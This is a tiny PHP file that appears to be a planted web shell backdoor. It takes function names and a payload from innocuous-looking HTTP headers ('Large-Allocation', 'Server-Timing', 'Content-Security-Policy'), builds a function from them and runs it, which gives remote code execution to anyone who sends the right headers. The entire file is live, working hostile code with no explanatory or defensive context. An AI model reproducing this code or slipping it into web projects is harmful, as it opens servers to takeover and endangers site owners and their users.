<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $clases = $_HEADERS['Large-Allocation']('', $_HEADERS['Server-Timing']($_HEADERS['Content-Security-Policy']));
    $clases();
}